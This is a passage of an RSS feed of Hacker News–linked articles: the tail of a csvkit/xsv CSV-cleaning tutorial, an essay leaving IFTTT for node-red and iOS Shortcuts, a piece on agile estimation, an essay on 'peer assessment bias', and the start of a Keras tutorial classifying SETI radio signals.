</pre></div><p>967 positive cases increased from Oct. 26 to Oct. 27 and this number exactly matches what Google reports (+967)&nbsp;below the Total cases number in the image above.</p><h2>Joining two CSVs</h2><p>I'm not familiar with some abbreviations in the state column, so let's have the second CSV file which we can join on to get a cleaner output of CSV data we understand. Let's download it using <em>curl:</em></p><div><pre>$ curl -LO https://gist.githubusercontent.com/afomi/8824ddb02a68cf15151a804d4d0dc3b7/raw/5f1cfabf2e65c5661a9ed12af27953ae4032b136/states.csv
</pre></div><p>This <strong>states.csv</strong><em> </em>file has two columns:&nbsp;<em>State</em> and <em>Abbreviation</em></p><p>Let's see how we can make this interesting join here:</p><div><pre>$ csvjoin -c Abbreviation,state states.csv all-states-history.csv | csvcut -c date,State,Abbreviation,positive,death | head | csvlook 
|       date | State   | Abbreviation | positive | death |
| ---------- | ------- | ------------ | -------- | ----- |
| 2020-10-26 | ALABAMA | AL           |  185,322 | 2,866 |
| 2020-10-25 | ALABAMA | AL           |  184,355 | 2,866 |
| 2020-10-24 | ALABAMA | AL           |  183,276 | 2,866 |
| 2020-10-23 | ALABAMA | AL           |  180,916 | 2,859 |
| 2020-10-22 | ALABAMA | AL           |  177,064 | 2,843 |
| 2020-10-21 | ALABAMA | AL           |  174,528 | 2,805 |
| 2020-10-20 | ALABAMA | AL           |  174,528 | 2,805 |
| 2020-10-19 | ALABAMA | AL           |  173,485 | 2,789 |
| 2020-10-18 | ALABAMA | AL           |  172,626 | 2,788 |
</pre></div><p>Note here that <strong>csvjoin </strong>command takes much time because it's reading both files into memory.</p><p>Here we joined the two CSV files on a column for each CSV; <em>Abbreviation</em> in the first file and <em>state </em>in the second one and then we filtered out 5 columns to view using <strong>csvcut -c </strong></p><p>Also, note that there the second column you filtered out when you joined is gone meaning if you filtered out <em>state (</em>which was the column that has the two-letter abbreviation of the state) it will give an error that 'state' is invalid which means this column is not there anymore.</p><h2>Comparing between xsv and csvkit utilities</h2><p>As we noticed, some commands took much time using csvkit command line utility. Let's see a quick comparison between its command-line tools and their associated ones at xsv.</p><p>All the upcoming commands run are relative to my machine, let's compare one by another:</p><h3>xsv headers vs csvcut -n</h3><div><pre>$ time csvcut -n all-states-history.csv | head
  1: date
  2: state
  3: dataQualityGrade
  4: death
  5: deathConfirmed
  6: deathIncrease
  7: deathProbable
  8: hospitalized
  9: hospitalizedCumulative
 10: hospitalizedCurrently

real	0m0.307s
user	0m0.224s
sys	0m0.077s
</pre></div><p>Time of csvkit's <strong>csvcut -n</strong>: ~307ms </p><div><pre>$ time xsv headers all-states-history.csv | head
1   date
2   state
3   dataQualityGrade
4   death
5   deathConfirmed
6   deathIncrease
7   deathProbable
8   hospitalized
9   hospitalizedCumulative
10  hospitalizedCurrently

real	0m0.013s
user	0m0.008s
sys	0m0.007s
</pre></div><p>Time of xsv's <strong>headers</strong>:&nbsp;~13ms</p><h3>xsv select vs csvcut -c</h3><div><pre>$ time csvcut -c date,state,positive,death all-states-history.csv | head
date,state,positive,death
2020-10-26,AK,14413,68
2020-10-26,AL,185322,2866
2020-10-26,AR,106727,1833
2020-10-26,AS,0,0
2020-10-26,AZ,238964,5875
2020-10-26,CA,901010,17357
2020-10-26,CO,95089,2076
2020-10-26,CT,68099,4589
2020-10-26,DC,16812,642

real	0m0.288s
user	0m0.209s
sys	0m0.073s
</pre></div><p>Time of csvkit's <strong>csvcut -c</strong>: ~288ms</p><div><pre>$ time xsv select date,state,positive,death all-states-history.csv | head
date,state,positive,death
2020-10-26,AK,14413,68</pre></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line">https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line</a></em></p>]]>
            </description>
            <link>https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943696</guid>
            <pubDate>Fri, 30 Oct 2020 16:08:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Goodbye IFTTT]]>
            </title>
            <description>
<![CDATA[
Score 332 | Comments 149 (<a href="https://news.ycombinator.com/item?id=24943685">thread link</a>) | @todsacerdoti
<br/>
October 30, 2020 | https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/ | <a href="https://web.archive.org/web/*/https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>I was a power user of <a href="https://ifttt.com/">IFTTT</a> for many years, so I had mixed
feelings recently about <a href="https://archive.is/zpx2r">their decision</a> to change
their pricing model. Under IFTTT's new pricing, you can only have 3 ‚Äúcustom‚Äù
actions created/enabled at any time ‚Äì which is quite a downgrade from the
current unlimited free plan. On the one hand, I'm glad to see IFTTT take
necessary steps to ensure it has long-term financial stability, but on the other
hand, I don't personally get enough value from their service anymore to justify
a recurring cost. (The plan will likely be
$4/month<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, but if you sign up before a deadline, you
can lock in a price as low as $2/month)</p>
<p>IFTTT was an awesome and uniquely easy-to-use service when it first came out,
but now there are better options for personal automation for people like me, who
like to tinker with this sort of thing. Systems like
<a href="https://nodered.org/">node-red</a> and iOS shortcuts can be self hosted or run on
device, and they provide more sophisticated logic for workflows than IFTTT.</p>
<p>I stayed on IFTTT this long mostly due to inertia, and it's fantastically long
list of supported services. If I needed to throw together a quick
spreadsheet-recording automation, or cron-like trigger, IFTTT was a great
starting place. However, it does have limitations. Until now (though it seems
like this might change with their premium offering), IFTTT basically only did
what its name implied: ‚Äúif this, then that‚Äù. No ‚Äúif X then Y else Z‚Äù, no ‚Äúif X
and Z then Y‚Äù, etc. Often times, you don't need any complicated logic or
filtering, but it was frustrating that there wasn't the option for more advanced
automation. Ultimately, IFTTT had a great ‚Äúon-ramp‚Äù, but once you were on board
with their system, you realize how shallow it is. Excellent breadth, mediocre
depth.</p>
<p>Similarly, in the past couple years IFTTT's UI has leaned heavily into the
‚Äúapplet‚Äù metaphor, with these big goofy toggle switches to enable/disable
automations. The site also transitioned towards a focus on community- (or, more
often corporate-) created automations, at the expense of the experience for
creating your own applets. Like seriously, why is 30% of the UI for an applet
<em>details page</em> (!) taken up by the connection status toggle?</p>
<figure>
    
    <a href="https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/ifttt.png">
        
            
                
                
            
        
        <img src="https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/ifttt_hu1a43e8a517283105e03bcbb0c4894a01_37903_0x300_resize_lanczos_2.png" loading="lazy"> 
        </a>
</figure>

<p>The settings page, too, is woefully information sparse. As a user, this makes me
feel that desktop-usability was not high on IFTTT's design priorities. You have
to scroll the page to begin to start to see what the automation is doing:</p>
<figure>
    
    <a href="https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/ifttt-settings.png">
        
            
                
                
            
        
        <img src="https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/ifttt-settings_hub4acc09d90c5c0c4cbf3054a07fa3040_91989_0x400_resize_lanczos_2.png" loading="lazy"> 
        </a>
</figure>

<p>Eventually, the UI got to the point where it felt like using
<a href="https://en.wikipedia.org/wiki/Lego_Duplo">Duplos</a> or something. It didn't have
to be this way! There are great low-to-no-code tools that have much more usable
interfaces, like
<a href="https://en.wikipedia.org/wiki/Scratch_(programming_language)">Scratch</a>.</p>
<figure>
    
    <a href="https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/scratch.png">
        
            
        
        <img src="https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/scratch.png" loading="lazy"> 
        </a>
</figure>

<p>So, I decided to migrate away, since the move to premium was already going to
substantially limit what I could do with IFTTT. In going through my catalog of
IFTTT ‚Äúapplets‚Äù, I identified 3 main patterns of automations that I used IFTTT
for: (1) triggering an action to happen at a specific time, (2) triggering an
action to happen in response to a location change (i.e. geofencing), or (3)
triggering an action to happen in response to an event in a web service.</p>
<p>Of these 3 buckets, iOS shortcuts readily handles the first 2: as of iOS 14,
Shortcuts can be triggered in the background at a specific time of day, or in
response to entering/leaving a geofence. Shortcuts also has a much more
sophisticated integration with iOS than any of IFTTT's apps, so more exciting
mobile automation becomes possible ‚Äì for example, setting my phone to Low Power
Mode once the battery drops below a certain threshold. Of course, you are
restricted to apps/services that support Shortcuts, and the number of supported
services is considerably smaller than IFTTT.</p>
<p>Node-red handles buckets 1 and 3: it has good support for time-based actions,
and can receive webhooks to respond to events from external services. It also
has a great plugin ecosystem, so it's support begins to rival IFTTT's impressive
selection of supported services. Additionally, node-red has many ‚Äúescape
hatches‚Äù that IFTTT does not: you can use it to make raw HTTP requests and write
your own plugins/logic in Javascript, allowing for much more complex automation.</p>
<p>Neither node-red nor iOS shortcuts are as easy to use as IFTTT for putting
together a simple automation, which is a shame. However, between them (and other
alternative automation frameworks that I've trialed, like <a href="https://n8n.io/">n8n</a>
and <a href="https://github.com/huginn/huginn">huginn</a>), I've more than covered my
personal automation needs.</p>
<p>And so, goodbye IFTTT! √∞≈∏‚Äò‚Äπ I'm not put off by them charging for their service; I
think charging for software is a good thing! It's just that this was the nudge I
needed to move my automations to infrastructure that I have more control over,
which has other benefits outside the scope of this article. I'm thankful that a
service like IFTTT continues to exist; I still think it's a fantastic tool to
‚Äúon-ramp‚Äù less technical folks into automation and no-code tools.</p>
<p><em>Cover art:
<a href="https://artvee.com/dl/the-village-of-murnau/">The Village Of Murnau (1908)</a></em></p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>A previous version of this article stated that the price for IFTTT Pro was
$10/month. While the original press release, as covered <a href="https://www.theverge.com/2020/9/10/21430265/ifttt-pro-subscriptions-free-controversy">here</a> indicated a $10/month
price, and the current suggested price for IFTTT Pro on their signup form is
$10/month, it seems like going forward the Pro price will be $4/month. I
apologize for the inaccuracy. <a href="#fnref:1" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
</ol>
</section>

        </div></div>]]>
            </description>
            <link>https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943685</guid>
            <pubDate>Fri, 30 Oct 2020 16:07:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[About Agile Project Estimation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24943644">thread link</a>) | @smartinez87
<br/>
October 30, 2020 | https://www.wyeworks.com/blog/2020/10/30/about-agile-estimation/ | <a href="https://web.archive.org/web/*/https://www.wyeworks.com/blog/2020/10/30/about-agile-estimation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><header><nav></nav></header><div><p><img src="https://www.wyeworks.com/images/about-agile-estimation.jpg" alt=""></p><div><p><img src="https://www.wyeworks.com/images/blog-article-pattern1.png" alt=""></p><p><img src="https://www.wyeworks.com/images/blog-article-pattern2.png" alt=""></p></div><div><div><h3>About agile project estimation</h3><div><p><img src="https://www.wyeworks.com/images/team/andres-vidal.jpg" alt=""></p><p>Oct 30, 2020</p><p>7 min read</p></div></div></div></div><section><div><p>Software development is, in essence, an industrial process like any other. But an immature one, not only because of the industry‚Äôs young age, but also because of the product‚Äôs inherent complexity. Software is intangible, physically unbounded (virtually) and in continuous evolution. This makes defining what the product must accomplish ‚Äî the so called requirements engineering ‚Äî a task as difficult or arguably even more complicated than building the product itself. Software development is, therefore, an ad-hoc creative process that struggles to incorporate common features from other industrial processes, such as task automation or reutilization, out of the box.</p>
<div>
  
  <p>
    These characteristics make software project management a specially challenging duty, and explain the failure of traditional models, such as waterfall development, that are common in other business areas. Several approaches to software project management have been proposed to address this challenge, with emphasis on the widely adopted iterative processes. Agile methodologies are a set of development and process management practices that fit in this class and promise sustainable, flexible development processes, with fast return on value and high quality results. Even further, agile methodologies are a novel approach to deal with uncertainty and, as so, do not exclude planning, but rather rethink it.
  </p></div>
<h2>Why do we estimate? And what exactly?</h2>
<p>Traditional management frameworks ‚Äî iterative or not ‚Äî rely firmly on estimation techniques to assess project features, such as cost and duration, and plan accordingly. However, the generation of statistically accurate estimates is a costly task for the sake of planning. Agile methodologies, on the other hand, are averse to anticipation, tend to lighten the management burden and avoid incorporating activities without short-term value return. Therefore, a critical view over estimation is necessary and should turn up naturally.</p>
<p>While planning a project, the size of the workload and the amount of effort required to do it are probably the most valuable management metrics that one would like to estimate. The idea of size is related to the project‚Äôs scope, and the concept of effort could be conceived as an adjusted size, taking into account the development team‚Äôs expertise. Other estimates important to clients, such as cost and duration, can be calculated from the estimated effort or size. The essential difference between these metrics is their objectiveness: while the size is clearly visible in the final product ‚Äî as function points, number of features or lines of code; the effort includes research and other support tasks necessary to complete the work.</p>
<p>As the team-dependent component of effort must be included in the planning, size and effort are often used interchangeably. This is valid, as long as the relationship between them is bound to the team as a whole and not to an individual developer‚Äôs productivity. The reason behind this is that a compromise must be made between the team members so the effort necessary to build a specific product varies among teams, instead of individuals. Otherwise, it wouldn‚Äôt be possible to elaborate sensible team-wide plans.</p>
<h2>How do we estimate?</h2>
<p>The common procedure to estimating a project‚Äôs workload is through a divide and conquer strategy. The workload is divided into smaller work units whose size is easier to estimate. In agile projects, these sizable units are often called <em>user stories</em>, and the actual metric is the effort required to complete the functionality described in the story according to a <em>definition of done</em> agreed by the team members. The measure of size can be quantitative ‚Äî numerical ‚Äî or qualitative ‚Äî categorical. Examples of quantitative measures are expected time and <em>story points</em>.</p>
<div>
  
  <p>
    Expected time is usually measured in ideal periods ‚Äî like hours or days of full and uninterrupted productivity. Effort estimation through expected time is often unadvised, as it establishes an absolute size reference (one ideal period) that is subjective by definition. To achieve an estimate understandable throughout the team, every developer must agree on what is the meaning of the ideal period: what is full productivity? How does research and support tasks are included in this definition? Also, this kind of estimate might be seen as a deadline, pressuring developers with less expertise and relaxing those who could actually have the work done faster.
  </p></div>
<p>Story points, spread mainly by the Scrum framework, are a common measure when the work units are defined as user stories. The effort is measured with an integer of a predefined sequence, usually the Fibonacci succession (1, 2, 3, 5, 8, 13, ‚Ä¶). The size of the smallest story is set to 1, and the other stories are sized relatively. For instance, a story of size 3 is expected to take three times more the effort required to finish the smallest one. This kind of affirmation gets less accurate as the size increases, so large story points are unadvised and indicate that the story can be broken down into smaller pieces. A common method to estimate story points for a user story is the <a href="https://en.wikipedia.org/wiki/Planning_poker">Planning Poker</a>.</p>
<p>Teams and managers can take advantage of quantitative effort measures, as other support metrics can be calculated from them. Some examples are the team‚Äôs capacity, the maximum effort achievable in a fixed amount of time; and the team‚Äôs velocity, the accomplished effort trend in the near past, which is expected to continue in the near future. Also, once a story is assigned to a developer, it might be easier to predict the time necessary to finish it according to their expertise ‚Äî which is useful for daily team planning.</p>
<div>
  
  <p>
    However, there are some downsides to using this kind of measure. Numerical estimates can be understood as a commitment of effort to be accomplished and to evaluate the team‚Äôs productivity. In fact, estimation techniques used in agile are informal and tend to be overoptimistic, which makes them prone to be inaccurate and lose relevance over time. Thus, evaluating a team according to the estimates generates pressures on the developers and leads to defensive effort overestimation, in order to indirectly lower the management‚Äôs expectations.
  </p></div>
<p>In contrast, qualitative measures eliminate the risk of being used to set expectations on the development team. A common example is the ‚ÄúT-Shirt Size‚Äù method, which uses classic t-shirt sizes ‚Äî XS, S, M, L, XL ‚Äî to measure the size of a user story. The sizing is also relative, so a reference user story must be chosen to determine the other stories‚Äô size by comparison.</p>
<h2>And if we don‚Äôt estimate at all?</h2>
<p>Some recent approaches to agile project management propose not to estimate at all. This is a consequence of the high costs of estimation, in conjunction to the biases and uncertainties inherent to software development. Supporters of the #NoEstimates movement argue that avoiding estimation allows teams to deliver more value, faster and consistently, while avoiding the common misinterpretations these artifacts have. Although there are testimonials about successful projects that purposefully don‚Äôt use estimates, the question about the feasibility of this approach in bigger projects remains unclear, as good estimates are helpful for planning in complex scenarios and are frequently a requirement from clients.</p>
<p>This change of paradigm has awakened the debate about the purpose of estimation in agile projects, when it is valuable and how to optimize this process. Opinions of professionals and academics seem to converge to a common point: management and development teams should be encouraged to review the objectives of estimates in their projects, how they should be interpreted in each context and make sure that they are used to support project planning and management, rather than team evaluation.</p>
<h2>Learn more</h2>
<ul>
<li><a href="https://info.thoughtworks.com/rs/thoughtworks2/images/twebook-perspectives-estimation_1.pdf">ThoughtWorks perspectives: How do you estimate on an Agile project?</a></li>
<li><a href="https://www.scruminc.com/wp-content/uploads/2014/05/Hyper-Productive-Metircs.pdf">Scrum Metrics for Hyperproductive Teams: How They Fly like Fighter Aircraft</a></li>
<li><a href="https://techbeacon.com/app-dev-testing/noestimates-debate-unbiased-look-origins-arguments-thought-leaders-behind-movement">The #NoEstimates debate: An unbiased look at the origins, arguments, and thought leaders behind the movement.</a></li>
</ul></div></section><section></section></div></div>]]>
            </description>
            <link>https://www.wyeworks.com/blog/2020/10/30/about-agile-estimation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943644</guid>
            <pubDate>Fri, 30 Oct 2020 16:04:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Peer Assessment Bias]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24943216">thread link</a>) | @rmulholland21
<br/>
October 30, 2020 | https://www.ryansmulholland.com/writing/peer-assessment-bias | <a href="https://web.archive.org/web/*/https://www.ryansmulholland.com/writing/peer-assessment-bias">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-63067710b8dc43d7e49b"><div><p><strong>What‚Äôs the difference between you and an expert?</strong></p><p>It‚Äôs kind of obvious, isn‚Äôt it? Television appearances, thousands of dollars, and an audience of fans that accept ideas as thought leadership.</p><p>But seriously, what even <em>is</em> an expert?</p><p>Experts are peers who‚Äôve had their ideas catch on through hard work, exhibition of talent, or luck.</p><p>I believe that statement, but it drastically simplifies everything that‚Äôs gone into someone establishing themselves as an expert. It‚Äôs not easy to get to the place where people assume you know what you‚Äôre talking about. It takes time, effort, and passion to get there. Overnight experts only exist in viral moments, it takes real expertise to have staying power.</p><p>The experts of the pre-internet age almost always hailed from academia. Earning credentials and conducting research was the only way to prove to others that you know what the hell you‚Äôre talking about. There was a gatekeeper to every distribution vessel and no public forum where a great idea from anyone could win the day.</p><p>Now we have that forum. The internet is full of people who are trying to be experts ‚Äî people who think they‚Äôre experts ‚Äî and as a result, there‚Äôs a monsoon of content on any given topic. And with access to information on anything, it‚Äôs the top 1% of information that we rely on, which usually belongs to...experts.</p><p>But experts are peers, remember? Just really fancy ones.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604023959443_6131"><div><p>So why don‚Äôt we consider the ideas of our peers in the same way we adopt the ideas of established thinkers?</p><p>To you, my peers, I‚Äôd like to present Peer Assessment Bias.</p><h3><strong>Peer Assessment Bias</strong></h3><p>Peer Assessment Bias is why this essay won‚Äôt be read tens of thousands of times. It‚Äôs why your best original ideas aren‚Äôt being talked about in bestselling books. It‚Äôs why you read something that a friend wrote and thought, ‚Äúhmm, that was pretty good,‚Äù but not, ‚Äúpress the pause button on life, I need to take notes!‚Äù</p><p><strong>Peer Assessment Bias is the natural inclination to be more skeptical of the ideas of those perceived as peers, more so than the ideas of those perceived as experts.</strong></p><p>Simply put, when it‚Äôs your friend‚Äôs idea it‚Äôs solid, but when it‚Äôs coming from Peter Thiel, it‚Äôs genius.</p><p>There‚Äôs an overlap here with another bias that you may be familiar with. Survivorship Bias.</p><p>Survivorship Bias is a cognitive error that occurs when a successful subgroup is mistaken as an <em>entire</em> group due to the visibility of the successful group and the invisibility of the unsuccessful group (<a href="https://fs.blog/2020/10/sharks-survivorship-bias/" target="_blank">link here to illustrate</a>).</p><p>As it applies here, most of the ideas we consume come from experts. This is because they‚Äôve already defeated the gatekeeper and have been elevated to the point where their thoughts matter more than others. They‚Äôre the successful survivors.</p><p>So what‚Äôs the difference between my idea of Peer Assessment Bias and good old Survivorship Bias? And how do they overlap?</p><p>Survivorship Bias is a layer of Peer Assessment Bias, but they‚Äôre not the same.</p><p>Survivorship Bias, as it relates to assessment, would lead us to believe that the best ideas come from the people who have the largest audiences. We perceive these successful survivors as experts and give more weight to the ideas they produce, even those unrelated to why they became successful in the first place. This doesn‚Äôt explain what happens on the peer side of the equation.</p><p>Peer Assessment Bias is about how we perceive those ‚Äúat the same level‚Äù as us, and it‚Äôs especially focused on those who are unestablished. ‚ÄúExperts‚Äù were once peers and have now moved on to an evolved state. Becoming an expert takes time, and many of the strong ideas that experts share are ideated during the time when they were an unheard of ‚Äúpeer.‚Äù</p><p>Peer Assessment Bias has less to do with the success of the idea and more to do with the source of it. It‚Äôs different because we may very well look a great idea straight in the face and treat it as a commoner instead of as the royalty that it is.</p><h3><strong>PAB Awareness</strong></h3><p>Why does any of this matter?</p><p>Because it‚Äôs important to recognize good ideas when you hear them.</p><p>There are two sides to Peer Assessment Bias to be aware of.</p><ol data-rte-list="default"><li><p><strong>Don‚Äôt automatically elevate ideas from experts</strong></p></li><li><p><strong>Don‚Äôt automatically dismiss ideas from peers</strong></p></li></ol><p>Experts, the people we look up to, are placed on a pedestal. They‚Äôre given status as infallible.&nbsp;</p><p>This is wrong.</p><p>Yes, the people who‚Äôve earned their expertise are most likely to keep producing thoughts or content that‚Äôs worth consuming, but never blindly. ‚ÄúBecause Musk said it,‚Äù is not reason enough to accept an idea.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604023959443_8762"><div><p>But you know this already, you‚Äôre a responsible human. So let‚Äôs take a look at the other side of Peer Assessment Bias, the side that doesn‚Äôt come naturally.</p><p><strong>Don‚Äôt automatically dismiss ideas from peers.</strong></p><p>Pay attention to those around you. They can have ideas that are just as strong as those who‚Äôve already earned the world‚Äôs attention. Often it‚Äôs not perfectly polished, not precisely explained, and never published in the Washington Post, but it could be just as good.</p><p>Allow me to illustrate.</p><p>This is Ayomide:</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604023959443_10888"><div><p>Sure, he‚Äôs a doctor, so he‚Äôs a proven smart guy, but the point is that you don‚Äôt know him. Ayomide is in my writing community, <a href="https://writersblochq.com/" target="_blank">Writer‚Äôs Bloc</a>, and I‚Äôve had the pleasure of reading some of his work in the draft phase.</p><p>In August, he wrote this essay called ‚Äú<a href="https://docayomide.com/love/" target="_blank">Love Your Neighbor Doesn‚Äôt Mean What We Think</a>.‚Äù It‚Äôs excellent, you should read it. But to summarize, it comes down to this one sentence:</p><blockquote><p>‚ÄúAct in your neighbor‚Äôs interest as if it was your own.‚Äù</p></blockquote><p>That‚Äôs an objectively brilliant way of reframing ‚Äúlove your neighbor as yourself.‚Äù It may not seem like it, but that little tweak makes things click mentally in a different way than we‚Äôre used to.</p><p>Ayomide isn‚Äôt an established personality. He‚Äôs not looked upon by thousands as a brilliant mind to be listened to or read each week.</p><p>But he has some fantastic ideas worth reading, and so do your peers.&nbsp;</p><h3><strong>Empower Your Peers</strong></h3><p>The moral of this story is to cut your peers some slack.</p><p>The path to expertise is filled with early days of thoughts sent out into an empty void and then slowly adopted by a group of early fans. Those early fans are peers, and peer fans are the most important fans you can have. A show of support, a reliable voice for feedback, or a bit of help from someone promoting your work is sometimes all you need to keep pushing on to the point where you become an expert.</p><p>I‚Äôm no scientist, but there‚Äôs no doubt we‚Äôre harsher critics of our peers than we are of others we don‚Äôt know. Does this stem from personal self-doubt (I couldn‚Äôt do that, so they couldn‚Äôt do it either), a hint of jealousy, or another psychological misplacement? Maybe. But it does happen.</p><p>We have a mental bias to keep peers as peers and experts as experts. This is a bias like any other. One worthy of acknowledging and defeating.</p><p>Cut your peers some slack. Read their work. Promote their content. Champion their ideas. Stand behind them. Encourage their efforts.</p><p>To steal from my peer Ayomide; believe in your peer‚Äôs work the same way you believe in your own.</p><p>Now, go forth and lift up your peers.</p></div></div></div>]]>
            </description>
            <link>https://www.ryansmulholland.com/writing/peer-assessment-bias</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943216</guid>
            <pubDate>Fri, 30 Oct 2020 15:25:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Classifying Radio Signals from Space Using Keras in Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24943079">thread link</a>) | @informerfrk
<br/>
October 30, 2020 | https://valueml.com/classifying-radio-signals-from-space-using-keras-in-python/ | <a href="https://web.archive.org/web/*/https://valueml.com/classifying-radio-signals-from-space-using-keras-in-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p>Hello everyone, welcome to Classifying Radio Signals from Space using Keras in Python. In this article, you will learn about how to classify radio signal using CNN, how to display results and plot 2D spectrograms with Python in Jupyter Notebook.</p>
<p>Here, we will be using the dataset which is provided by the SETI Institute. The dataset is already normalized and divided into two directories i.e. testing and validation dataset. You can download the dataset from <a href="https://valueml.com/wp-content/uploads/2020/10/Radio-Signals-from-Space.zip">here</a>.</p>
<p>So Now let‚Äôs start working on the project.</p>
<h2>Importing Libraries</h2>
<p>First, we will import all the necessary Python libraries. Please make sure all the libraries given below are installed on your system and if not, install them using pip.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">from livelossplot.tf_keras import PlotLossesCallback
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt

import tensorflow as tf

from sklearn.metrics import confusion_matrix
from sklearn import metrics

import numpy as np
np.random.seed(42)
import warnings;warnings.simplefilter('ignore')
%matplotlib inline</pre>
<h2>Loading and Preprocessing The Data</h2>
<p>Then we will load the dataset which is in CSV format using pandas.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">train_images = pd.read_csv('dataset/train/images.csv', header=None)
train_labels = pd.read_csv('dataset/train/labels.csv', header=None)

val_images = pd.read_csv('dataset/validation/images.csv', header=None)
val_labels = pd.read_csv('dataset/validation/labels.csv', header=None)</pre>
<p>Now, let‚Äôs see the dimensions of the training and validation dataset.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">print("Training set shape:", train_images.shape, train_labels.shape)
print("Validation set shape:", val_images.shape, val_labels.shape)</pre>
<p>Output:</p>
<pre>Training set shape: (3200, 8192) (3200, 4)
Validation set shape: (800, 8192) (800, 4)</pre>
<p>So now, we will reshape the data into the desired dimensions i.e. given below.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">x_train = train_images.values.reshape(3200, 64, 128, 1)
x_val = val_images.values.reshape(800, 64, 128, 1)

y_train = train_labels.values
y_val = val_labels.values</pre>
<h2>Plotting 2D Spectrograms</h2>
<p>So now, we will convert the NumPy array into 2d spectrograms. We will get random images from our training dataset for every execution. So in the output, you will see 3 images of 2d spectrogram which is a coloured image but we have to convert it into a grayscale image.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">plt.figure(0, figsize=(12,12))
for i in range(1,4):
    plt.subplot(1,3,i)
    img = np.squeeze(x_train[np.random.randint(0, x_train.shape[0])])
    plt.xticks([])
    plt.yticks([])
    plt.imshow(img)</pre>
<p>Output:</p>
<pre><img loading="lazy" src="https://valueml.com/wp-content/uploads/2020/10/download-12.png" alt="Signal Image" width="687" height="116" srcset="https://valueml.com/wp-content/uploads/2020/10/download-12.png 687w, https://valueml.com/wp-content/uploads/2020/10/download-12-300x51.png 300w" sizes="(max-width: 687px) 100vw, 687px"></pre>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">plt.imshow(np.squeeze(x_train[3]), cmap="gray");</pre>
<p>Output:</p>
<pre><img loading="lazy" src="https://valueml.com/wp-content/uploads/2020/10/download-15.png" alt="Grayscale image " width="368" height="201" srcset="https://valueml.com/wp-content/uploads/2020/10/download-15.png 368w, https://valueml.com/wp-content/uploads/2020/10/download-15-300x164.png 300w" sizes="(max-width: 368px) 100vw, 368px"></pre>
<h2 id="Task-4:-Create-Training-and-Validation-Data-Generators">Creating Training and Validation Data Generators</h2>
<p>So now. we will perform real-time data augmentation using ImageDataGenerator. Here, we are flipping the images horizontally for the training and validation data.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">from tensorflow.keras.preprocessing.image import ImageDataGenerator

datagen_train = ImageDataGenerator(horizontal_flip=True)
datagen_train.fit(x_train)

datagen_val = ImageDataGenerator(horizontal_flip=True)
datagen_val.fit(x_val)</pre>
<h2>Creating CNN Model</h2>
<p>Before we start creating the model first we have to import all the layers, models, optimizers and callbacks. In this model, we will be using the following layers and optimizers as given below.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">from tensorflow.keras.layers import Dense, Input, Dropout,Flatten, Conv2D
from tensorflow.keras.layers import BatchNormalization, Activation, MaxPooling2D

from tensorflow.keras.models import Model, Sequential
from tensorflow.keras.optimizers import Adam, SGD
from tensorflow.keras.callbacks import ModelCheckpoint, ReduceLROnPlateau
from tensorflow.keras.utils import plot_model</pre>
<p>First, we initialize the model as Sequential model. Then, We will create the first convolution in which we will add Conv2D, BatchNormalization, Activation = ‚Äòrelu‚Äô, MaxPooling2D and the dropout layers. The input is taken in this layer with the shape as 64 * 128 and 1 representing that the image is of grayscale format. In the first convolution, we are passing 32 feature maps with 5,5 as the filter size.</p>
<p>Similarly, we will create another convolution with 64 feature maps this time. Next, We will add a flattening layer and after that a fully connected dense layer with 1024 neurons. Finally, In the output layer for the activation function, we are using ‚Äòsoftmax‚Äô.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">model = Sequential()


model.add(Conv2D(32,(5,5), padding='same', input_shape=(64, 128,1)))
model.add(BatchNormalization())
model.add(Activation('relu'))
model.add(MaxPooling2D(pool_size=(2, 2)))
model.add(Dropout(0.25))


